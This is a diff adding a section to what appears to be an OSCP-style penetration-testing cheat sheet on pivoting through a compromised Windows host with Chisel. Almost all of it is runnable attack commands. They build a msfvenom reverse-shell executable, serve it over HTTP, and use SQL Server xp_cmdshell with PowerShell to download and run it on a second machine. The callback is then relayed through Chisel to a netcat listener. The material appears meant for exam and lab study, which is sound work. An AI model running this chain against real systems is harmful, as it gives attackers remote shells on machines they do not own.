@@ -3091,6 +3091,217 @@ If the victim cannot access `http://127.0.0.1:8080`, check that:
 - You used reverse syntax with `R:` only for victim-to-Kali forwarding.
 - You used a high victim-side port like `8080` if you do not have admin/root.
 
+## 15.6 Chisel Port forwarding through another machine (Useful for AD set OSCP B)
+#### Step 0 - Create `reverse.exe` with msfvenom
+
+Before hosting the payload, generate a Windows reverse shell executable.
+
+If MS02 can connect directly to Kali, set `LHOST` to your Kali VPN/tun0 IP:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_TUN0_IP> LPORT=443 -f exe -o reverse.exe
+```
+
+Example:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.175 LPORT=443 -f exe -o reverse.exe
+```
+
+Start a listener on Kali:
+
+```bash
+rlwrap nc -nlvp 443
+```
+
+Then, after MS02 downloads `reverse.exe`, execute it:
+
+```sql
+EXEC xp_cmdshell 'C:\Users\Public\reverse.exe';
+```
+
+---
+
+#### Important: If MS02 Cannot Reach Kali Directly
+
+If MS02 cannot connect directly back to Kali, do **not** set `LHOST` to Kali. Instead, make MS02 connect back to MS01, and have MS01 forward the callback to Kali.
+
+Goal:
+
+```text
+MS02 reverse.exe -> connects to MS01:4444
+MS01 Chisel      -> forwards MS01:4444 back to Kali:443
+Kali nc listener -> catches shell on port 443
+```
+
+Generate `reverse.exe` so it connects to MS01’s internal IP:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MS01_INTERNAL_IP> LPORT=4444 -f exe -o reverse.exe
+```
+
+Example:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.132.147 LPORT=4444 -f exe -o reverse.exe
+```
+
+Start your Kali listener:
+
+```bash
+rlwrap nc -nlvp 443
+```
+
+On Kali, start Chisel server:
+
+```bash
+./chisel_1.11.5_linux_amd64 server --port 8000 --reverse -v
+```
+
+On MS01, run Chisel with **two forwards**:
+
+```powershell
+.\chisel.exe client -v 192.168.45.175:8000 0.0.0.0:18080:127.0.0.1:80 R:4444:127.0.0.1:443
+```
+
+Explanation:
+
+```text
+0.0.0.0:18080:127.0.0.1:80
+    MS01 listens on 18080.
+    MS02 downloads reverse.exe from MS01:18080.
+    MS01 forwards that HTTP request to Kali's Python web server on 127.0.0.1:80.
+
+R:4444:127.0.0.1:443
+    Kali-side Chisel server listens on port 4444 by default when using R.
+    Not ideal for this specific callback pattern if you need MS01 to listen on 4444.
+```
+
+Better callback option: run a second **normal forward** on MS01 so MS01 listens on `4444` and forwards to Kali listener `443`:
+
+```powershell
+.\chisel.exe client -v 192.168.45.175:8000 0.0.0.0:18080:127.0.0.1:80 0.0.0.0:4444:127.0.0.1:443
+```
+
+Use this when MS02 can reach MS01 on port `4444`.
+
+Then from MS02, download the payload through MS01:
+
+```sql
+EXEC xp_cmdshell 'powershell -c "iwr -UseBasicParsing -uri http://<MS01_INTERNAL_IP>:18080/reverse.exe -OutFile C:\Users\Public\reverse.exe"';
+```
+
+Example:
+
+```sql
+EXEC xp_cmdshell 'powershell -c "iwr -UseBasicParsing -uri http://10.10.132.147:18080/reverse.exe -OutFile C:\Users\Public\reverse.exe"';
+```
+
+Execute it:
+
+```sql
+EXEC xp_cmdshell 'C:\Users\Public\reverse.exe';
+```
+
+Expected callback path:
+
+```text
+MS02 -> 10.10.132.147:4444 -> Chisel on MS01 -> Kali 127.0.0.1:443 -> nc listener
+```
+
+---
+
+#### Full Working Pattern: MS02 Downloads from MS01 and Calls Back Through MS01
+
+On Kali, create the payload with `LHOST` set to MS01’s internal IP:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MS01_INTERNAL_IP> LPORT=4444 -f exe -o reverse.exe
+```
+
+Example:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.132.147 LPORT=4444 -f exe -o reverse.exe
+```
+
+On Kali, serve the payload:
+
+```bash
+sudo python3 -m http.server 80
+```
+
+On Kali, start the listener:
+
+```bash
+rlwrap nc -nlvp 443
+```
+
+On Kali, start Chisel server:
+
+```bash
+./chisel_1.11.5_linux_amd64 server --port 8000 --reverse -v
+```
+
+On MS01, expose Kali web server and Kali listener through MS01:
+
+```powershell
+.\chisel.exe client -v <KALI_TUN0_IP>:8000 0.0.0.0:18080:127.0.0.1:80 0.0.0.0:4444:127.0.0.1:443
+```
+
+Example:
+
+```powershell
+.\chisel.exe client -v 192.168.45.175:8000 0.0.0.0:18080:127.0.0.1:80 0.0.0.0:4444:127.0.0.1:443
+```
+
+On MS02, download `reverse.exe` from MS01:
+
+```sql
+EXEC xp_cmdshell 'powershell -c "iwr -UseBasicParsing -uri http://<MS01_INTERNAL_IP>:18080/reverse.exe -OutFile C:\Users\Public\reverse.exe"';
+```
+
+Example:
+
+```sql
+EXEC xp_cmdshell 'powershell -c "iwr -UseBasicParsing -uri http://10.10.132.147:18080/reverse.exe -OutFile C:\Users\Public\reverse.exe"';
+```
+
+On MS02, execute the payload:
+
+```sql
+EXEC xp_cmdshell 'C:\Users\Public\reverse.exe';
+```
+
+Catch the shell on Kali:
+
+```bash
+rlwrap nc -nlvp 443
+```
+
+#### Quick Verification
+
+On MS01, confirm both ports are listening:
+
+```powershell
+netstat -ano | findstr 18080
+netstat -ano | findstr 4444
+```
+
+On MS02, confirm it can reach MS01’s file-forwarding port:
+
+```sql
+EXEC xp_cmdshell 'powershell -c "Test-NetConnection <MS01_INTERNAL_IP> -Port 18080"';
+```
+
+On MS02, confirm it can reach MS01’s callback-forwarding port:
+
+```sql
+EXEC xp_cmdshell 'powershell -c "Test-NetConnection <MS01_INTERNAL_IP> -Port 4444"';
+```
+
+If both return `TcpTestSucceeded : True`, the download and callback path should work.
+
 ## 16. Exam-Proven Attack Patterns
 
 ### Exposed `.git` to SSH
